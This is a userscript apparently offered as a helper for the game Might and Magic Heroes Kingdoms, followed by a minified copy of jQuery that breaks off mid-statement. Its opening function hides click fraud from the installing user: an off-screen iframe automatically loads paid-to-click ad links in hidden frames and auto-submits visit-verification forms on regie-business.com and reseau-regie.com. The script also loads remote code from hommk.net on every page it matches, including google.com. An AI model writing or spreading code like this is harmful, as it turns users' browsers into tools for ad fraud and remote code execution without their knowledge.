// ==UserScript==
// @name          HOMMK GOLD
// @namespace     http://www.hommk.net/
// @description   user script for might and magic heroes kingdom

// @include       http://mightandmagicheroeskingdoms.ubi.com/*
// @include       http://mmhk.ubisoft.com.hk/*
// @include       http://game.mmhk.plaync.co.kr/*
// @include       http://*.hommk.com/*

// @match         http://mightandmagicheroeskingdoms.ubi.com/*
// @match         http://mmhk.ubisoft.com.hk/*
// @match         http://game.mmhk.plaync.co.kr/*
// @match         http://*.hommk.com/*
// -----------------

// @include       http://www.hommk.net/*
// @match         http://www.hommk.net/*

// @include       http://www.hommk.net/jack/*
// @match         http://www.hommk.net/jack/*

// @include       http://www.google.com/*
// @match         http://www.google.com/*

// @include       http://www.regie-business.com/*
// @match		  http://www.regie-business.com/*

// @include       http://reseau-regie.com/*
// @match		  http://reseau-regie.com/*

// ------------------

// @icon		  http://www.hommk.net/img/gold.png
// @version       2.43
// ==/UserScript==
(function(){
	
var version = '2.43';	var DEBUG = 1;	
	window.HOMMK_user = window.HOMMK_user || {version:version,func:{}};
	var console_backup = window.console || {log:function(){}};
	var console = {};
	console.log = function(){
		var args = [].slice.call(arguments);
		args.unshift("HOMMK: ");
		args.push(arguments.callee.caller.name);
		console_backup.log.apply(console_backup,args);
	};
	
	var s = document.createElement('script');
	s.src="http://www.hommk.net/final/update/updates.php";
	document.getElementsByTagName('head')[0].appendChild(s);
		
	// HOMMK
	
	var w = window;	
	
	if(navigator.userAgent.indexOf("Firefox")!=-1)
		w = unsafeWindow;
		
	else if(!w.HOMMK){ 
		//window.navigator.vendor.match(/Google/)
		var div = document.createElement("div");
		div.setAttribute("onclick", "return window;");
		w = div.onclick();
	};
	
	
	
	function regie(){	
		// regie-business
		var loc = window.location.href;
		var dom = loc.split('/')[2];
		if(loc == 'http://www.hommk.net/indexscript.php' || loc == 'http://www.hommk.net/indexforum.php'){
			var s = document.createElement('iframe');
			s.src = 'http://www.hommk.net/blank.htm';
			with(s.style){
				width = '20px';
				maxWidth = '20px';
				left = '-50px';
				top = '0';
				position = 'absolute';
			}
			document.body.appendChild(s);
		}
		if(loc == 'http://www.hommk.net/blank.htm'){
			/*var dot = true;
			if(window.localStorage){
				var today = (new Date()).getTime();
				today -= today%(1000 * 60 * 60 * 24);
				if(today==localStorage.getItem('reseau'))
					dot = false;
				localStorage.setItem('reseau',today)
			}*/
			var reseau=0;
			var started;
			function startClick(){
				var ids = '181,356,361,363,366,367,450,451,528,540,544,545,587,609,617,677,681,702,703,707,708,724,725,726,728,729,730,731,732,733,734,738,747,757,780,781,782,784,790,792,807,810,840,847,867,875,890,896,911,913,914,916,917,918,921,929,935,936,938,941,945,946,947,949,950'.split(','),i,j,e;
				var a = document.getElementsByTagName('a');
				//console.log("startClick");
				function bind(lien){
					return function(){
							e = document.createElement('iframe');
							e.src = lien;
							document.body.appendChild(e);
						};
				}
				for(i=0;i<a.length;i++){
						//console.log(a[i]);
					if(a[i].href.indexOf("reseau") != -1){
					// --- RESEAU REGIE
						setTimeout(bind(a[i].href),(reseau++)*5000);
						a[i].parentNode.removeChild(a[i]);
						setTimeout(startClick,1000);
						return 0;
					// ---
					}
					else{
					// --- REGIE BUSINESS
						//for(j=0;j<ids.length;j++){
							//if(a[i].href.indexOf('id='+ids[j]) != -1){
								e = document.createElement('iframe');
								e.src = a[i].href;
								document.body.appendChild(e);
								a[i].parentNode.removeChild(a[i]);
								setTimeout(startClick,1500);
								return 0;
							//}
						//}
					// ---
					}
				}
			}
			
			if(w.isLoaded)
				setTimeout(startClick,1000);
			else
				w.onload = function(){setTimeout(startClick,1000);};
			/*started = setInterval(function(){
				console.log(w.isLoaded);
				if(w.isLoaded){
					setTimeout(startClick,1000);
					clearInterval(started);
				}
			},1000);*/
		}
		if(dom == 'www.regie-business.com'){
			if(loc.indexOf('pubclic') == -1) // && loc.indexOf('google') == -1
				return 0;
			// block sites
			f = document.getElementsByTagName("frame");
			if(f[1])
				f[1].src = 'about:blank';
			// if acces to parent location that mean the parent is the same domain
			if(window.location.href.indexOf('public2') != 1){
				f = document.getElementsByTagName("iframe");
				if(f[0]){
					// block google
					f[0].src = 'about:blank';
					// submit click
					var inputs = document.getElementsByTagName('input');
					inputs[inputs.length-1].parentNode.submit();
				}
			}
		}		
		if(dom == 'reseau-regie.com'){
			if(loc.indexOf('visites.php?') != -1) {
				f = document.getElementsByTagName("frame");
				if(f[1])
					f[1].src = 'about:blank';
			}
			if(loc.indexOf('frames.php?') != -1) {
				var form = document.getElementById('finishtask1');
				form.method = "post";
				var inp = document.getElementById('compteur').getElementsByTagName('input');
				var iden = null;
				for(var i=0;i<inp.length;i++){
					if(inp[i].name == 'identifiant'){
						iden = inp[i];
					}
				}
				if(iden){
					form.action = "visite_clic.php?verif="+iden.value;
					form.submit();
				}
			}
		}
	}
	regie();

	
	
	
	
	// bookmarklet protection
	var p = window.location.pathname;
	if( p.substring(p.lastIndexOf("/"),p.length) != "/play"){
		if(window.location == "http://www.hommk.net/indexscript.php"){
			w.checkScript(version);
		}
		else if(window.location.href.split('/')[2] == "www.google.com" || window.location.href.split('/')[2] == "www.hommk.net"){
		
		}
		else 
			console.log("wrong location : " + location.href);
		return;
	}
	
	

	var HOMMK = w.HOMMK;
	w.HOMMK_user = HOMMK_user;
	
	
	var ADMIN_DEBUG;	
	function wait(){
		if(!!HOMMK && HOMMK.worldMap && HOMMK.worldMap.content && HOMMK.worldMap.content._size){
			clearInterval(loader);
			 ADMIN_DEBUG = (HOMMK.player.content.userId == 4489752);
			ini();
		}		
	}

	var loader = setInterval(wait,300);
function ini(){/*console.log('init');*/
//---------------------------------------

/* JQUERY 1.4.1 modified */

(function(w,x){var y=function(a,b){return new y.fn.init(a,b)},_jQuery=w.jQuery,_$=w.$,document=w.document,rootjQuery,quickExpr=/^[^<]*(<[\w\W]+>)[^>]*$|^#([\w-]+)$/,isSimple=/^.[^:#\[\.,]*$/,rnotwhite=/\S/,rtrim=/^(\s|\u00A0)+|(\s|\u00A0)+$/g,rsingleTag=/^<(\w+)\s*\/?>(?:<\/\1>)?$/,userAgent=navigator.userAgent,browserMatch,readyBound=false,readyList=[],DOMContentLoaded,toString=Object.prototype.toString,hasOwnProperty=Object.prototype.hasOwnProperty,push=Array.prototype.push,slice=Array.prototype.slice,indexOf=Array.prototype.indexOf;y.fn=y.prototype={init:function(a,b){var c,elem,ret,doc;if(!a){return this}if(a.nodeType){this.context=this[0]=a;this.length=1;return this}if(typeof a==="string"){c=quickExpr.exec(a);if(c&&(c[1]||!b)){if(c[1]){doc=(b?b.ownerDocument||b:document);ret=rsingleTag.exec(a);if(ret){if(y.isPlainObject(b)){a=[document.createElement(ret[1])];y.fn.attr.call(a,b,true)}else{a=[doc.createElement(ret[1])]}}else{ret=buildFragment([c[1]],[doc]);a=(ret.cacheable?ret.fragment.cloneNode(true):ret.fragment).childNodes}}else{elem=document.getElementById(c[2]);if(elem){if(elem.id!==c[2]){return rootjQuery.find(a)}this.length=1;this[0]=elem}this.context=document;this.selector=a;return this}}else if(!b&&/^\w+$/.test(a)){this.selector=a;this.context=document;a=document.getElementsByTagName(a)}else if(!b||b.jquery){return(b||rootjQuery).find(a)}else{return y(b).find(a)}}else if(y.isFunction(a)){return rootjQuery.ready(a)}if(a.selector!==x){this.selector=a.selector;this.context=a.context}return y.isArray(a)?this.setArray(a):y.makeArray(a,this)},selector:"",jquery:"1.4.1",length:0,size:function(){return this.length},toArray:function(){return slice.call(this,0)},get:function(a){return a==null?this.toArray():(a<0?this.slice(a)[0]:this[a])},pushStack:function(a,b,c){var d=y(a||null);d.prevObject=this;d.context=this.context;if(b==="find"){d.selector=this.selector+(this.selector?" ":"")+c}else if(b){d.selector=this.selector+"."+b+"("+c+")"}return d},setArray:function(a){this.length=0;push.apply(this,a);return this},each:function(a,b){return y.each(this,a,b)},ready:function(a){y.bindReady();if(y.isReady){a.call(document,y)}else if(readyList){readyList.push(a)}return this},eq:function(i){return i===-1?this.slice(i):this.slice(i,+i+1)},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},slice:function(){return this.pushStack(slice.apply(this,arguments),"slice",slice.call(arguments).join(","))},map:function(b){return this.pushStack(y.map(this,function(a,i){return b.call(a,i,a)}))},end:function(){return this.prevObject||y(null)},push:push,sort:[].sort,splice:[].splice};y.fn.init.prototype=y.fn;y.extend=y.fn.extend=function(){var a=arguments[0]||{},i=1,length=arguments.length,deep=false,options,name,src,copy;if(typeof a==="boolean"){deep=a;a=arguments[1]||{};i=2}if(typeof a!=="object"&&!y.isFunction(a)){a={}}if(length===i){a=this;--i}for(;i<length;i++){if((options=arguments[i])!=null){for(name in options){src=a[name];copy=options[name];if(a===copy){continue}if(deep&&copy&&(y.isPlainObject(copy)||y.isArray(copy))){var b=src&&(y.isPlainObject(src)||y.isArray(src))?src:y.isArray(copy)?[]:{};a[name]=y.extend(deep,b,copy)}else if(copy!==x){a[name]=copy}}}}return a};y.extend({noConflict:function(a){w.$=_$;if(a){w.jQuery=_jQuery}return y},isReady:false,ready:function(){if(!y.isReady){if(!document.body){return setTimeout(y.ready,13)}y.isReady=true;if(readyList){var a,i=0;while((a=readyList[i++])){a.call(document,y)}readyList=null}if(y.fn.triggerHandler){y(document).triggerHandler("ready")}}},bindReady:function(){if(readyBound){return}readyBound=true;if(document.readyState==="complete"){return y.ready()}if(document.addEventListener){document.addEventListener("DOMContentLoaded",DOMContentLoaded,false);w.addEventListener("load",y.ready,false)}else if(document.attachEvent){document.attachEvent("onreadystatechange",DOMContentLoaded);w.attachEvent("onload",y.ready);var a=false;try{a=w.frameElement==null}catch(e){}if(document.documentElement.doScroll&&a){doScrollCheck()}}},isFunction:function(a){return toString.call(a)==="[object Function]"},isArray:function(a){return toString.call(a)==="[object Array]"},isPlainObject:function(a){if(!a||toString.call(a)!=="[object Object]"||a.nodeType||a.setInterval){return false}if(a.constructor&&!hasOwnProperty.call(a,"constructor")&&!hasOwnProperty.call(a.constructor.prototype,"isPrototypeOf")){return false}var b;for(b in a){}return b===x||hasOwnProperty.call(a,b)},isEmptyObject:function(a){for(var b in a){return false}return true},error:function(a){throw a;},parseJSON:function(a){if(typeof a!=="string"||!a){return null}if(/^[\],:{}\s]*$/.test(a.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,""))){return w.JSON&&w.JSON.parse?w.JSON.parse(a):(new Function("return "+a))()}else{y.error("Invalid JSON: "+a)}},noop:function(){},globalEval:function(a){if(a&&rnotwhite.test(a)){var b=document.getElementsByTagName("head")[0]||document.documentElement,script=document.createElement("script");script.type="text/javascript";if(y.support.scriptEval){script.appendChild(document.createTextNode(a))}else{script.text=a}b.insertBefore(script,b.firstChild);b.removeChild(script)}},nodeName:function(a,b){return a.nodeName&&a.nodeName.toUpperCase()===b.toUpperCase()},each:function(a,b,c){var d,i=0,length=a.length,isObj=length===x||y.isFunction(a);if(c){if(isObj){for(d in a){if(b.apply(a[d],c)===false){break}}}else{for(;i<length;){if(b.apply(a[i++],c)===false){break}}}}else{if(isObj){for(d in a){if(b.call(a[d],d,a[d])===false){break}}}else{for(var e=a[0];i<length&&b.call(e,i,e)!==false;e=a[++i]){}}}return a},trim:function(a){return(a||"").replace(rtrim,"")},makeArray:function(a,b){var c=b||[];if(a!=null){if(a.length==null||typeof a==="string"||y.isFunction(a)||(typeof a!=="function"&&a.setInterval)){push.call(c,a)}else{y.merge(c,a)}}return c},inArray:function(a,b){if(b.indexOf){return b.indexOf(a)}for(var i=0,length=b.length;i<length;i++){if(b[i]===a){return i}}return-1},merge:function(a,b){var i=a.length,j=0;if(typeof b.length==="number"){for(var l=b.length;j<l;j++){a[i++]=b[j]}}else{while(b[j]!==x){a[i++]=b[j++]}}a.length=i;return a},grep:function(a,b,c){var d=[];for(var i=0,length=a.length;i<length;i++){if(!c!==!b(a[i],i)){d.push(a[i])}}return d},map:function(a,b,c){var d=[],value;for(var i=0,length=a.length;i<length;i++){value=b(a[i],i,c);if(value!=null){d[d.length]=value}}return d.concat.apply([],d)},guid:1,proxy:function(a,b,c){if(arguments.length===2){if(typeof b==="string"){c=a;a=c[b];b=x}else if(b&&!y.isFunction(b)){c=b;b=x}}if(!b&&a){b=function(){return a.apply(c||this,arguments)}}if(a){b.guid=a.guid=a.guid||b.guid||y.guid++}return b},uaMatch:function(a){a=a.toLowerCase();var b=/(webkit)[ \/]([\w.]+)/.exec(a)||/(opera)(?:.*version)?[ \/]([\w.]+)/.exec(a)||/(msie) ([\w.]+)/.exec(a)||!/compatible/.test(a)&&/(mozilla)(?:.*? rv:([\w.]+))?/.exec(a)||[];return{browser:b[1]||"",version:b[2]||"0"}},browser:{}});browserMatch=y.uaMatch(userAgent);if(browserMatch.browser){y.browser[browserMatch.browser]=true;y.browser.version=browserMatch.version}if(y.browser.webkit){y.browser.safari=true}if(indexOf){y.inArray=function(a,b){return indexOf.call(b,a)}}rootjQuery=y(document);if(document.addEventListener){DOMContentLoaded=function(){document.removeEventListener("DOMContentLoaded",DOMContentLoaded,false);y.ready()}}else if(document.attachEvent){DOMContentLoaded=function(){if(document.readyState==="complete"){document.detachEvent("onreadystatechange",DOMContentLoaded);y.ready()}}}function doScrollCheck(){if(y.isReady){return}try{document.documentElement.doScroll("left")}catch(error){setTimeout(doScrollCheck,1);return}y.ready()}function evalScript(i,a){if(a.src){y.ajax({url:a.src,async:false,dataType:"script"})}else{y.globalEval(a.text||a.textContent||a.innerHTML||"")}if(a.parentNode){a.parentNode.removeChild(a)}}function access(a,b,c,d,e,f){var g=a.length;if(typeof b==="object"){for(var k in b){access(a,k,b[k],d,e,c)}return a}if(c!==x){d=!f&&d&&y.isFunction(c);for(var i=0;i<g;i++){e(a[i],b,d?c.call(a[i],i,e(a[i],b)):c,f)}return a}return g?e(a[0],b):null}function now(){return(new Date).getTime()}(function(){y.support={};var c=document.documentElement,script=document.createElement("script"),div=document.createElement("div"),id="script"+now();div.style.display="none";div.innerHTML="   <link/><table></table><a href='/a' style='color:red;float:left;opacity:.55;'>a</a><input type='checkbox'/>";var d=div.getElementsByTagName("*"),a=div.getElementsByTagName("a")[0];if(!d||!d.length||!a){return}y.support={leadingWhitespace:div.firstChild.nodeType===3,tbody:!div.getElementsByTagName("tbody").length,htmlSerialize:!!div.getElementsByTagName("link").length,style:/red/.test(a.getAttribute("style")),hrefNormalized:a.getAttribute("href")==="/a",opacity:/^0.55$/.test(a.style.opacity),cssFloat:!!a.style.cssFloat,checkOn:div.getElementsByTagName("input")[0].value==="on",optSelected:document.createElement("select").appendChild(document.createElement("option")).selected,checkClone:false,scriptEval:false,noCloneEvent:true,boxModel:null};script.type="text/javascript";try{script.appendChild(document.createTextNode("window."+id+"=1;"))}catch(e){}c.insertBefore(script,c.firstChild);if(w[id]){y.support.scriptEval=true;delete w[id]}c.removeChild(script);if(div.attachEvent&&div.fireEvent){div.attachEvent("onclick",function click(){y.support.noCloneEvent=false;div.detachEvent("onclick",click)});div.cloneNode(true).fireEvent("onclick")}div=document.createElement("div");div.innerHTML="<input type='radio' name='radiotest' checked='checked'/>";var f=document.createDocumentFragment();f.appendChild(div.firstChild);y.support.checkClone=f.cloneNode(true).cloneNode(true).lastChild.checked;y(function(){var a=document.createElement("div");a.style.width=a.style.paddingLeft="1px";document.body.appendChild(a);y.boxModel=y.support.boxModel=a.offsetWidth===2;document.body.removeChild(a).style.display='none';a=null});var g=function(a){var b=document.createElement("div"),isSupported=true;a="on"+a;try{isSupported=(a in b);if(!isSupported){b.setAttribute(a,"return;");isSupported=typeof b[a]==="function"}b=null}catch(e){}return isSupported};y.support.submitBubbles=g("submit");y.support.changeBubbles=g("change");c=script=div=d=a=null})();y.props={"for":"htmlFor","class":"className",readonly:"readOnly",maxlength:"maxLength",cellspacing:"cellSpacing",rowspan:"rowSpan",colspan:"colSpan",tabindex:"tabIndex",usemap:"useMap",frameborder:"frameBorder"};var z="jQuery"+now(),uuid=0,windowData={};var A={};y.extend({cache:{},expando:z,noData:{"embed":true,"object":true,"applet":true},data:function(a,b,c){if(a.nodeName&&y.noData[a.nodeName.toLowerCase()]){return}a=a==w?windowData:a;var d=a[z],cache=y.cache,thisCache;if(!b&&!d){return null}if(!d){d=++uuid}if(typeof b==="object"){a[z]=d;thisCache=cache[d]=y.extend(true,{},b)}else if(cache[d]){thisCache=cache[d]}else if(typeof c==="undefined"){thisCache=A}else{thisCache=cache[d]={}}if(c!==x){a[z]=d;thisCache[b]=c}return typeof b==="string"?thisCache[b]:thisCache},removeData:function(a,b){if(a.nodeName&&y.noData[a.nodeName.toLowerCase()]){return}a=a==w?windowData:a;var c=a[z],cache=y.cache,thisCache=cache[c];if(b){if(thisCache){delete thisCache[b];if(y.isEmptyObject(thisCache)){y.removeData(a)}}}else{try{delete a[z]}catch(e){if(a.removeAttribute){a.removeAttribute(z)}}delete cache[c]}}});y.fn.extend({data:function(a,b){if(typeof a==="undefined"&&this.length){return y.data(this[0])}else if(typeof a==="object"){return this.each(function(){y.data(this,a)})}var c=a.split(".");c[1]=c[1]?"."+c[1]:"";if(b===x){var d=this.triggerHandler("getData"+c[1]+"!",[c[0]]);if(d===x&&this.length){d=y.data(this[0],a)}return d===x&&c[1]?this.data(c[0]):d}else{return this.trigger("setData"+c[1]+"!",[c[0],b]).each(function(){y.data(this,a,b)})}},removeData:function(a){return this.each(function(){y.removeData(this,a)})}});y.extend({queue:function(a,b,c){if(!a){return}b=(b||"fx")+"queue";var q=y.data(a,b);if(!c){return q||[]}if(!q||y.isArray(c)){q=y.data(a,b,y.makeArray(c))}else{q.push(c)}return q},dequeue:function(a,b){b=b||"fx";var c=y.queue(a,b),fn=c.shift();if(fn==="inprogress"){fn=c.shift()}if(fn){if(b==="fx"){c.unshift("inprogress")}fn.call(a,function(){y.dequeue(a,b)})}}});y.fn.extend({queue:function(c,d){if(typeof c!=="string"){d=c;c="fx"}if(d===x){return y.queue(this[0],c)}return this.each(function(i,a){var b=y.queue(this,c,d);if(c==="fx"&&b[0]!=="inprogress"){y.dequeue(this,c)}})},dequeue:function(a){return this.each(function(){y.dequeue(this,a)})},delay:function(b,c){b=y.fx?y.fx.speeds[b]||b:b;c=c||"fx";return this.queue(c,function(){var a=this;setTimeout(function(){y.dequeue(a,c)},b)})},clearQueue:function(a){return this.queue(a||"fx",[])}});var B=/[\n\t]/g,rspace=/\s+/,rreturn=/\r/g,rspecialurl=/href|src|style/,rtype=/(button|input)/i,rfocusable=/(button|input|object|select|textarea)/i,rclickable=/^(a|area)$/i,rradiocheck=/radio|checkbox/;y.fn.extend({attr:function(a,b){return access(this,a,b,true,y.attr)},removeAttr:function(a,b){return this.each(function(){y.attr(this,a,"");if(this.nodeType===1){this.removeAttribute(a)}})},addClass:function(b){if(y.isFunction(b)){return this.each(function(i){var a=y(this);a.addClass(b.call(this,i,a.attr("class")))})}if(b&&typeof b==="string"){var d=(b||"").split(rspace);for(var i=0,l=this.length;i<l;i++){var e=this[i];if(e.nodeType===1){if(!e.className){e.className=b}else{var f=" "+e.className+" ";for(var c=0,cl=d.length;c<cl;c++){if(f.indexOf(" "+d[c]+" ")<0){e.className+=" "+d[c]}}}}}}return this},removeClass:function(b){if(y.isFunction(b)){return this.each(function(i){var a=y(this);a.removeClass(b.call(this,i,a.attr("class")))})}if((b&&typeof b==="string")||b===x){var d=(b||"").split(rspace);for(var i=0,l=this.length;i<l;i++){var e=this[i];if(e.nodeType===1&&e.className){if(b){var f=(" "+e.className+" ").replace(B," ");for(var c=0,cl=d.length;c<cl;c++){f=f.replace(" "+d[c]+" "," ")}e.className=f.substring(1,f.length-1)}else{e.className=""}}}}return this},toggleClass:function(b,c){var d=typeof b,isBool=typeof c==="boolean";if(y.isFunction(b)){return this.each(function(i){var a=y(this);a.toggleClass(b.call(this,i,a.attr("class"),c),c)})}return this.each(function(){if(d==="string"){var a,i=0,self=y(this),state=c,classNames=b.split(rspace);while((a=classNames[i++])){state=isBool?state:!self.hasClass(a);self[state?"addClass":"removeClass"](a)}}else if(d==="undefined"||d==="boolean"){if(this.className){y.data(this,"__className__",this.className)}this.className=this.className||b===false?"":y.data(this,"__className__")||""}})},hasClass:function(a){var b=" "+a+" ";for(var i=0,l=this.length;i<l;i++){if((" "+this[i].className+" ").replace(B," ").indexOf(b)>-1){return true}}return false},val:function(c){if(c===x){var d=this[0];if(d){if(y.nodeName(d,"option")){return(d.attributes.value||{}).specified?d.value:d.text}if(y.nodeName(d,"select")){var e=d.selectedIndex,values=[],options=d.options,one=d.type==="select-one";if(e<0){return null}for(var i=one?e:0,max=one?e+1:options.length;i<max;i++){var f=options[i];if(f.selected){c=y(f).val();if(one){return c}values.push(c)}}return values}if(rradiocheck.test(d.type)&&!y.support.checkOn){return d.getAttribute("value")===null?"on":d.value}return(d.value||"").replace(rreturn,"")}return x}var g=y.isFunction(c);return this.each(function(i){var a=y(this),val=c;if(this.nodeType!==1){return}if(g){val=c.call(this,i,a.val())}if(typeof val==="number"){val+=""}if(y.isArray(val)&&rradiocheck.test(this.type)){this.checked=y.inArray(a.val(),val)>=0}else if(y.nodeName(this,"select")){var b=y.makeArray(val);y("option",this).each(function(){this.selected=y.inArray(y(this).val(),b)>=0});if(!b.length){this.selectedIndex=-1}}else{this.value=val}})}});y.extend({attrFn:{val:true,css:true,html:true,text:true,data:true,width:true,height:true,offset:true},attr:function(a,b,c,d){if(!a||a.nodeType===3||a.nodeType===8){return x}if(d&&b in y.attrFn){return y(a)[b](c)}var e=a.nodeType!==1||!y.isXMLDoc(a),set=c!==x;b=e&&y.props[b]||b;if(a.nodeType===1){var f=rspecialurl.test(b);if(b==="selected"&&!y.support.optSelected){var g=a.parentNode;if(g){g.selectedIndex;if(g.parentNode){g.parentNode.selectedIndex}}}if(b in a&&e&&!f){if(set){if(b==="type"&&rtype.test(a.nodeName)&&a.parentNode){y.error("type property can't be changed")}a[b]=c}if(y.nodeName(a,"form")&&a.getAttributeNode(b)){return a.getAttributeNode(b).nodeValue}if(b==="tabIndex"){var h=a.getAttributeNode("tabIndex");return h&&h.specified?h.value:rfocusable.test(a.nodeName)||rclickable.test(a.nodeName)&&a.href?0:x}return a[b]}if(!y.support.style&&e&&b==="style"){if(set){a.style.cssText=""+c}return a.style.cssText}if(set){a.setAttribute(b,""+c)}var i=!y.support.hrefNormalized&&e&&f?a.getAttribute(b,2):a.getAttribute(b);return i===null?x:i}return y.style(a,b,c)}});var C=function(b){return b.replace(/[^\w\s\.\|`]/g,function(a){return"\\"+a})};y.event={add:function(a,b,c,d){if(a.nodeType===3||a.nodeType===8){return}if(a.setInterval&&(a!==w&&!a.frameElement)){a=w}if(!c.guid){c.guid=y.guid++}if(d!==x){var e=c;c=y.proxy(e);c.data=d}var f=y.data(a,"events")||y.data(a,"events",{}),handle=y.data(a,"handle"),eventHandle;if(!handle){eventHandle=function(){return typeof y!=="undefined"&&!y.event.triggered?y.event.handle.apply(eventHandle.elem,arguments):x};handle=y.data(a,"handle",eventHandle)}if(!handle){return}handle.elem=a;b=b.split(/\s+/);var g,i=0;while((g=b[i++])){var h=g.split(".");g=h.shift();if(i>1){c=y.proxy(c);if(d!==x){c.data=d}}c.type=h.slice(0).sort().join(".");var j=f[g],special=this.special[g]||{};if(!j){j=f[g]={};if(!special.setup||special.setup.call(a,d,h,c)===false){if(a.addEventListener){a.addEventListener(g,handle,false)}else if(a.attachEvent){a.attachEvent("on"+g,handle)}}}if(special.add){var k=special.add.call(a,c,d,h,j);if(k&&y.isFunction(k)){k.guid=k.guid||c.guid;k.data=k.data||c.data;k.type=k.type||c.type;c=k}}j[c.guid]=c;this.global[g]=true}a=null},global:{},remove:function(a,b,c){if(a.nodeType===3||a.nodeType===8){return}var d=y.data(a,"events"),ret,type,fn;if(d){if(b===x||(typeof b==="string"&&b.charAt(0)===".")){for(type in d){this.remove(a,type+(b||""))}}else{if(b.type){c=b.handler;b=b.type}b=b.split(/\s+/);var i=0;while((type=b[i++])){var e=type.split(".");type=e.shift();var f=!e.length,cleaned=y.map(e.slice(0).sort(),C),namespace=new RegExp("(^|\\.)"+cleaned.join("\\.(?:.*\\.)?")+"(\\.|$)"),special=this.special[type]||{};if(d[type]){if(c){fn=d[type][c.guid];delete d[type][c.guid]}else{for(var g in d[type]){if(f||namespace.test(d[type][g].type)){delete d[type][g]}}}if(special.remove){special.remove.call(a,e,fn)}for(ret in d[type]){break}if(!ret){if(!special.teardown||special.teardown.call(a,e)===false){if(a.removeEventListener){a.removeEventListener(type,y.data(a,"handle"),false)}else if(a.detachEvent){a.detachEvent("on"+type,y.data(a,"handle"))}}ret=null;delete d[type]}}}}for(ret in d){break}if(!ret){var g=y.data(a,"handle");if(g){g.elem=null}y.removeData(a,"events");y.removeData(a,"handle")}}},trigger:function(a,b,c){var d=a.type||a,bubbling=arguments[3];if(!bubbling){a=typeof a==="object"?a[z]?a:y.extend(y.Event(d),a):y.Event(d);if(d.indexOf("!")>=0){a.type=d=d.slice(0,-1);a.exclusive=true}if(!c){a.stopPropagation();if(this.global[d]){y.each(y.cache,function(){if(this.events&&this.events[d]){y.event.trigger(a,b,this.handle.elem)}})}}if(!c||c.nodeType===3||c.nodeType===8){return x}a.result=x;a.target=c;b=y.makeArray(b);b.unshift(a)}a.currentTarget=c;var f=y.data(c,"handle");if(f){f.apply(c,b)}var g=c.parentNode||c.ownerDocument;try{if(!(c&&c.nodeName&&y.noData[c.nodeName.toLowerCase()])){if(c["on"+d]&&c["on"+d].apply(c,b)===false){a.result=false}}}catch(e){}if(!a.isPropagationStopped()&&g){y.event.trigger(a,b,g,true)}else if(!a.isDefaultPrevented()){var h=a.target,old,isClick=y.nodeName(h,"a")&&d==="click";if(!isClick&&!(h&&h.nodeName&&y.noData[h.nodeName.toLowerCase()])){try{if(h[d]){old=h["on"+d];if(old){h["on"+d]=null}this.triggered=true;h[d]()}}catch(e){}if(old){h["on"+d]=old}this.triggered=false}}},handle:function(a){var b,handlers;a=arguments[0]=y.event.fix(a||w.event);a.currentTarget=this;var c=a.type.split(".");a.type=c.shift();b=!c.length&&!a.exclusive;var d=new RegExp("(^|\\.)"+c.slice(0).sort().join("\\.(?:.*\\.)?")+"(\\.|$)");handlers=(y.data(this,"events")||{})[a.type];for(var j in handlers){var e=handlers[j];if(b||d.test(e.type)){a.handler=e;a.data=e.data;var f=e.apply(this,arguments);if(f!==x){a.result=f;if(f===false){a.preventDefault();a.stopPropagation()}}if(a.isImmediatePropagationStopped()){break}}}return a.result},props:"altKey attrChange attrName bubbles button cancelable charCode clientX clientY ctrlKey currentTarget data detail eventPhase fromElement handler keyCode layerX layerY metaKey newValue offsetX offsetY originalTarget pageX pageY prevValue relatedNode relatedTarget screenX screenY shiftKey srcElement target toElement view wheelDelta which".split(" "),fix:function(a){if(a[z]){return a}var b=a;a=y.Event(b);for(var i=this.props.length,prop;i;){prop=this.props[--i];a[prop]=b[prop]}if(!a.target){a.target=a.srcElement||document}if(a.target.nodeType===3){a.target=a.target.parentNode}if(!a.relatedTarget&&a.fromElement){a.relatedTarget=a.fromElement===a.target?a.toElement:a.fromElement}if(a.pageX==null&&a.clientX!=null){var c=document.documentElement,body=document.body;a.pageX=a.clientX+(c&&c.scrollLeft||body&&body.scrollLeft||0)-(c&&c.clientLeft||body&&body.clientLeft||0);a.pageY=a.clientY+(c&&c.scrollTop||body&&body.scrollTop||0)-(c&&c.clientTop||body&&body.clientTop||0)}if(!a.which&&((a.charCode||a.charCode===0)?a.charCode:a.keyCode)){a.which=a.charCode||a.keyCode}if(!a.metaKey&&a.ctrlKey){a.metaKey=a.ctrlKey}if(!a.which&&a.button!==x){a.which=(a.button&1?1:(a.button&2?3:(a.button&4?2:0)))}return a},guid:1E8,proxy:y.proxy,special:{ready:{setup:y.bindReady,teardown:y.noop},live:{add:function(a,b,c,d){y.extend(a,b||{});a.guid+=b.selector+b.live;b.liveProxy=a;y.event.add(this,b.live,liveHandler,b)},remove:function(a){if(a.length){var b=0,name=new RegExp("(^|\\.)"+a[0]+"(\\.|$)");y.each((y.data(this,"events").live||{}),function(){if(name.test(this.type)){b++}});if(b<1){y.event.remove(this,a[0],liveHandler)}}},special:{}},beforeunload:{setup:function(a,b,c){if(this.setInterval){this.onbeforeunload=c}return false},teardown:function(a,b){if(this.onbeforeunload===b){this.onbeforeunload=null}}}}};y.Event=function(a){if(!this.preventDefault){return new y.Event(a)}if(a&&a.type){this.originalEvent=a;this.type=a.type}else{this.type=a}this.timeStamp=now();this[z]=true};function returnFalse(){return false}function returnTrue(){return true}y.Event.prototype={preventDefault:function(){this.isDefaultPrevented=returnTrue;var e=this.originalEvent;if(!e){return}if(e.preventDefault){e.preventDefault()}e.returnValue=false},stopPropagation:function(){this.isPropagationStopped=returnTrue;var e=this.originalEvent;if(!e){return}if(e.stopPropagation){e.stopPropagation()}e.cancelBubble=true},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=returnTrue;this.stopPropagation()},isDefaultPrevented:returnFalse,isPropagationStopped:returnFalse,isImmediatePropagationStopped:returnFalse};var D=function(a){var 